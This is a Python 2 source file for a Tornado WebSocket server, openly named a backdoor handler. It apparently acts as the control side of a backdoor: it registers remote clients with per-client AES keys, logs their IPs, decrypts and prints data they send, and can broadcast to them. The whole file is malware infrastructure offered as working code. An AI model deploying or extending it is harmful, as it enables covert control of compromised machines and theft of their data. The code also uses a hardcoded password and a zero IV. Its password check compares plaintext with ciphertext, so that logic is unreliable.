#!/usr/bin/env python
# coding:utf-8
import tornado.web
import tornado.websocket
import tornado.ioloop
import json
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
__author__ = 'nekocode'


class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
    clients = set()
    PASSWORD = '110110'

    def data_received(self, chunk):
        pass

    @staticmethod
    def send_to_all(message):
        for c in BackdoorSocketHandler.clients:
            c.write_message(json.dumps(message))

    def __init__(self, application, request, **kwargs):
        tornado.websocket.WebSocketHandler.__init__(self, application, request, **kwargs)
        self.ID = None
        self.IV = '\0' * AES.block_size
        self.SECRET = None
        self.is_controller = False

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain

    def open(self):
        pass

    def send_msg(self, data):
        msg = {'data': self.encrypt(data)}
        self.write_message(json.dumps(msg))

    def on_message(self, message):
        msg = json.loads(message)
        if 'id' in msg:
            self.ID = msg['id']
            self.SECRET = b64decode(msg['secret'])
            if 'pwd' in msg and BackdoorSocketHandler.PASSWORD == self.encrypt(msg['pwd']):
                self.is_controller = True
            BackdoorSocketHandler.clients.add(self)
            print 'find new client: ' + self.request.remote_ip + '(' + self.ID + ')'

        if self.ID:
            if 'data' in msg:
                data = self.decrypt(msg['data'])
                print data

    def on_close(self):
        BackdoorSocketHandler.clients.remove(self)


def run_server():
    application = tornado.web.Application([
        (r'/', BackdoorSocketHandler)
    ])

    application.listen(8888, xheaders=True)
    tornado.ioloop.IOLoop.instance().start()


if __name__ == '__main__':
    run_server()

